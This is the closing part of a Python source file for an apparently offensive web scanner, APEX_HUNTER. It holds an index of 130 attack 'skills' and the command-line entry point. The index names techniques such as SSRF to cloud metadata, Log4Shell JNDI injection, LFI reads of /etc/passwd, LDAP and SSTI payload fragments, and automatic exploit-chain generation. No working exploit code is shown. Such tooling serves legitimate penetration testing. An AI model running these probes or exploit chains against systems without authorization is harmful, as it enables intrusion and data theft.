SKILL-13  Secret/credential scanning with Shannon entropy (25 patterns)
SKILL-14  API endpoint discovery + Swagger/OpenAPI spec detection
SKILL-15  GraphQL introspection + schema extraction
SKILL-16  Sensitive file/directory enumeration (50+ paths)
SKILL-17  S3 bucket enumeration + public listing test
SKILL-18  Subdomain takeover detection (11 provider fingerprints)
SKILL-19  SSRF parameter identification + open redirect testing
SKILL-20  IDOR pattern mapping from historical URLs
SKILL-21  XSS injection surface identification (forms + inputs)
SKILL-22  ASN/hosting provider identification from IP CIDR ranges
SKILL-23  Wildcard DNS detection
SKILL-24  Googlebot WAF bypass testing
SKILL-25  Short-lived certificate (ACME/Let's Encrypt) detection
SKILL-26  Virtual host + subdomain live resolution
SKILL-27  Auto-chained PoC curl generation per finding
SKILL-28  CVSS v3.1 scoring + CWE/OWASP mapping
SKILL-29  Multi-format report export (JSON/HTML/Markdown/CSV)
SKILL-30  Burp Suite request template generation

NEW (Phase 7):
SKILL-31  HTTP Request Smuggling — CL.TE / TE.CL / TE.TE timing detection
SKILL-32  JWT vulnerability scanning — alg=none, weak secret, RS256→HS256
SKILL-33  OAuth 2.0 flow analysis — missing state, implicit flow, PKCE downgrade
SKILL-34  Host header injection — password reset poisoning + cache poisoning
SKILL-35  HTTP Parameter Pollution — duplicate params, array notation
SKILL-36  Rate limit bypass — X-Forwarded-For/X-Real-IP header spoofing
SKILL-37  Cache poisoning — unkeyed header injection + cache deception paths
SKILL-38  SSTI detection — {{7*7}} polyglot across Jinja2/Twig/Pebble/ERB
SKILL-39  XXE injection — OOB XXE, error-based file read, SVG vector, SOAP
SKILL-40  Prototype pollution — __proto__, constructor.prototype, URL + JSON
SKILL-41  GraphQL advanced attacks — batch aliases, introspection bypass
SKILL-42  Dependency confusion — internal package name leakage detection
SKILL-43  Business logic probe — negative price, overflow, coupon manipulation
SKILL-44  WebSocket security — CSWSH, ws:// downgrade, Origin bypass
SKILL-45  BOLA/IDOR deep scan — mass assignment, privilege escalation patterns

NEW (Phase 8 — 30 Advanced Red Team Skills):
SKILL-46  SQL injection — error-based + boolean-blind detection (9 DB engines)
SKILL-47  NoSQL injection — MongoDB $gt/$ne/$where/$regex operator injection
SKILL-48  Command injection — echo/id reflection-safe blind detection
SKILL-49  File upload bypass — double extension, polyglot JPEG+PHP, MIME confusion
SKILL-50  CSRF detection — missing token, no SameSite, no Origin validation
SKILL-51  Clickjacking — X-Frame-Options absent + frame-ancestors wildcard
SKILL-52  HTTP method tampering — TRACE/WebDAV/method override headers
SKILL-53  Account enumeration timing — login response time differential
SKILL-54  Path/ACL bypass — /admin/../user/ traversal + encoding bypass
SKILL-55  API version downgrade — v3→v1 privilege regression testing
SKILL-56  TLS misconfiguration — TLS 1.0/1.1 + weak ciphers (RC4/3DES/EXPORT)
SKILL-57  DNS zone transfer — AXFR attempt via system dig command
SKILL-58  Deserialization detection — Java magic bytes / PHP O:/ ViewState
SKILL-59  Blind SSRF — OOB payload generator (DNS/HTTP interactor URLs)
SKILL-60  Email header injection — CRLF in From/CC field for spam relay
SKILL-61  JSONP discovery — callback= CSP bypass + data leakage endpoints
SKILL-62  Referer ACL bypass — spoofed Referer to bypass origin-based access control
SKILL-63  2FA endpoint finder — OTP endpoint discovery + rate-limit absence
SKILL-64  Error page intelligence — stack traces / version strings in 4xx/5xx
SKILL-65  Open redirect chain — multi-hop + OAuth redirect_uri parameter abuse
SKILL-66  HTML injection — dangling markup + unencoded HTML in responses
SKILL-67  CORS preflight analysis — OPTIONS method + ACAO wildcard/null check
SKILL-68  Password reset poisoning — Host header poisoning + token reuse
SKILL-69  WebDAV scanner — PROPFIND 207 + PUT arbitrary file write attempt
SKILL-70  Content-Type confusion — MIME-type mirroring XSS via Content-Type
SKILL-71  Internal service discovery — SSRF→metadata/Kubernetes/internal map
SKILL-72  Subdomain live check — deep service fingerprinting on resolved hosts
SKILL-73  LFI scanner — /etc/passwd read via path traversal (10 encoding variants)
SKILL-74  Session security — fixation / token-in-URL / regeneration absence
SKILL-75  VDP discovery — security.txt + bug-bounty scope + Hall of Fame links

NEW (Phase 9 — 40 Advanced Red Team Skills):
SKILL-76  GraphQL batch/alias DoS — unbounded batching + alias amplification + depth
SKILL-77  Subresource Integrity (SRI) checker — CDN scripts/styles without integrity attr
SKILL-78  postMessage analyzer — listener without event.origin validation
SKILL-79  Web cache deception — /account.css path confusion triggering public cache
SKILL-80  Service worker audit — root-scope, importScripts external, credential forwarding
SKILL-81  CRLF / HTTP response splitting — %0d%0a header injection
SKILL-82  SAML vulnerability scanner — endpoint exposure for XSW/XXE/replay assessment
SKILL-83  OAuth2 implicit flow — response_type=token detection + fragment token exposure
SKILL-84  Virtual host fuzzer — Host header fuzzing for hidden vhosts
SKILL-85  Race condition tester — parallel request window detection on state-change EPs
SKILL-86  Token leakage scanner — auth tokens in redirect URLs + response body
SKILL-87  Cloud metadata SSRF — AWS/GCP/Azure IMDS payloads via SSRF parameters
SKILL-88  ETag inode leakage — Apache inode-size-mtime format exposure
SKILL-89  API auth bypass headers — X-Auth-User/X-Remote-User/X-Forwarded-User bypass
SKILL-90  Path parameter injection — REST path param IDOR + traversal + type confusion
SKILL-91  HTTP Trace XST — TRACE method + HttpOnly cookie cross-site tracing
SKILL-92  CSS injection / exfiltration — style attribute injection + attribute selectors
SKILL-93  CORS credential exposure — credentials:include + wildcard/reflected ACAO
SKILL-94  Mass assignment fuzzer — hidden privileged field injection in JSON APIs
SKILL-95  JWKS poisoning — JWK set URI exposure + alg:none detection
SKILL-96  ReDoS probe — catastrophic regex backtracking via crafted inputs
SKILL-97  Subdomain takeover v2 — extended fingerprints + dangling DNS detection
SKILL-98  HTTP/2 Rapid Reset — CVE-2023-44487 exposure assessment
SKILL-99  WebSocket CSWSH — cross-site WebSocket hijacking via Origin bypass
SKILL-100 Prototype pollution advanced — query string + JSON body + URL-encoded
SKILL-101 HPP advanced — REST/multipart/array notation parameter pollution
SKILL-102 IDOR v2 — second-order IDOR via object refs in API response bodies
SKILL-103 Forced browsing — admin/backup/config/debug unlinked page discovery
SKILL-104 Sensitive data exposure — PII/keys/internal IPs in API responses
SKILL-105 BFLA scanner — broken function-level authorization on privileged HTTP methods
SKILL-106 GraphQL mutation fuzzer — mass create + privilege escalation mutations
SKILL-107 Insecure CORS on API — arbitrary Origin reflection on authenticated endpoints
SKILL-108 SSL pinning bypass hints — certificate fingerprints for mobile research
SKILL-109 GraphQL field suggestion leak — hidden schema field enumeration via typos
SKILL-110 Dependency confusion v2 — multi-ecosystem manifest leakage (npm/pypi/gem/maven)
SKILL-111 Improper error handling — verbose stack traces + version strings
SKILL-112 HTTP desync advanced — CL.TE/TE.CL differential smuggling probes
SKILL-113 OAuth state CSRF — missing/predictable state parameter detection
SKILL-114 Exposed debug endpoints — pprof/jolokia/metrics/telescope/horizon/xdebug
SKILL-115 Blind OS command injection — echo-marker reflection via safe payloads

NEW (Phase 10 — BLACK TEAM — 15 Advanced Exploitation Skills):
SKILL-116 Log4Shell (CVE-2021-44228) — JNDI injection in 10 headers + OOB PoC
SKILL-117 XPath injection — boolean bypass + blind enumeration in auth/search
SKILL-118 LDAP injection — filter bypass (*(uid=*)) in login/directory endpoints
SKILL-119 SSI / ESI injection — <!--#exec cmd--> + <esi:include> detection
SKILL-120 PDF/HTML-to-PDF SSRF — file:// + metadata via headless renderer endpoints
SKILL-121 JWT algorithm confusion — RS256→HS256 public-key-as-secret forgery
SKILL-122 Blind XXE OOB — DTD-load payload generator + SVG XXE vector
SKILL-123 SSTI → RCE chain — Jinja2/Twig/FreeMarker/Velocity class-traversal PoC
SKILL-124 Cache poisoning advanced — fat GET, unkeyed cookie, X-Original-URL, param cloak
SKILL-125 OAuth token Referer leak — callback page third-party resource leakage
SKILL-126 SOAP/XML injection — CDATA injection, Billion Laughs, external entity
SKILL-127 PHP type juggling — 0e magic hash, null/false coercion, array bypass
SKILL-128 Webhook/callback SSRF — server-side URL fetch via notification endpoints
SKILL-129 Timing oracle — non-constant-time token comparison detection
SKILL-130 Full chain PoC generator — auto-synthesise exploit chain from all findings
"""

# ══════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ══════════════════════════════════════════════════════════════
def main():
    p = argparse.ArgumentParser(
        description="APEX_HUNTER v1.0 — 120 Tools | 130 Skills | Auto-Chain",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python APEX_HUNTER.py --target https://example.com --output ./results
  python APEX_HUNTER.py --target https://t1.com --target https://t2.com --output ./out
  python APEX_HUNTER.py --target https://example.com --output ./out --phases 1,2,3,7,8,9
  python APEX_HUNTER.py --target https://example.com --output ./out --workers 15 --rate 3.0
  python APEX_HUNTER.py --skills
""")
    p.add_argument("--target","-t", action="append", default=[], dest="targets",
                   help="Target URL (repeatable for multiple targets)")
    p.add_argument("--output","-o", default="./apex_output", help="Output directory")
    p.add_argument("--workers",  type=int,   default=10,  help="Concurrent workers")
    p.add_argument("--rate",     type=float, default=2.0, help="Requests per second")
    p.add_argument("--depth",    type=int,   default=3,   help="Crawl depth")
    p.add_argument("--timeout",  type=int,   default=20,  help="Request timeout (seconds)")
    p.add_argument("--scope",    action="append", default=[], dest="scope_extras")
    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8,9,10",
                   help="Phases to run (default: 1-10, e.g. 1,2,7,8,9,10)")
    p.add_argument("--skills",   action="store_true", help="Print skills index and exit")
    args = p.parse_args()

    if args.skills:
        print(SKILLS_INDEX); sys.exit(0)

    if not args.targets:
        p.print_help()
        print(f"\n{C.RED}Error: at least one --target required{C.NC}")
        sys.exit(1)

    try:
        phases = [int(x.strip()) for x in args.phases.split(",")]
    except ValueError:
        print(f"{C.RED}Error: --phases must be comma-separated integers{C.NC}"); sys.exit(1)

    cfg = Config(
        targets=args.targets, output=args.output,
        workers=args.workers, rate=args.rate, depth=args.depth,
        timeout=args.timeout, scope_extras=args.scope_extras, phases=phases)
    APEXOrchestrator(cfg).run()

if __name__ == "__main__":
    main()
